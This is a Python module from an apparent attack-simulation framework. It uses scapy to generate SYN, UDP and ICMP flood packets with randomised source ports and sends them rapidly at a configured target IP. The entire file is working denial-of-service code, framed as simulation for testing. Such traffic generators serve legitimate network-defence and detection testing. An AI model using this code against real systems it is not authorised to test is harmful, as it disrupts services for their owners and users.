"""
DoS Attack Simulation.
Generates volumetric and application-layer DoS traffic.
"""

from typing import Dict, Any, List
import random
from scapy.all import IP, TCP, UDP, ICMP, Raw, send # type: ignore

from .base_attack import BaseAttack

class DosAttack(BaseAttack):
    """Simulates Denial of Service attacks."""

    def build_packets(self, parameters: Dict[str, Any]) -> Any:
        """
        Builds DoS attack packets.
        
        Args:
            parameters: Can contain 'dos_type', 'target_port', 'count'
        """
        target_ip = parameters.get("target_ip", self.config.network.target_ip)
        dos_type = parameters.get("dos_type", "SYN_FLOOD").upper()
        target_port = parameters.get("target_port", 80)
        count = parameters.get("count", 100)

        self.logger.debug(f"Building {count} {dos_type} packets for {target_ip}:{target_port}")
        
        packets = []
        for _ in range(count):
            # Randomize source port and IP (if spoofing is enabled/allowed by network)
            # For local testing, we might just randomize source port
            sport = random.randint(1024, 65535)
            
            if dos_type == "SYN_FLOOD":
                packet = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
            elif dos_type == "UDP_FLOOD":
                payload = b"X" * random.randint(64, 512)
                packet = IP(dst=target_ip) / UDP(sport=sport, dport=target_port) / Raw(load=payload)
            elif dos_type == "ICMP_FLOOD":
                packet = IP(dst=target_ip) / ICMP() / Raw(load=b"PingFlood")
            else:
                self.logger.warning(f"Unknown DoS type {dos_type}, defaulting to SYN flood")
                packet = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
                
            packets.append(packet)
            
        return packets

    def send_packets(self, packets: Any, parameters: Dict[str, Any]) -> None:
        """Override to blast packets quickly."""
        interface = self.config.network.interface
        
        self.logger.info(f"Blasting {len(packets)} DoS packets on {interface}")
        send(packets, iface=interface, inter=0.001, verbose=False)
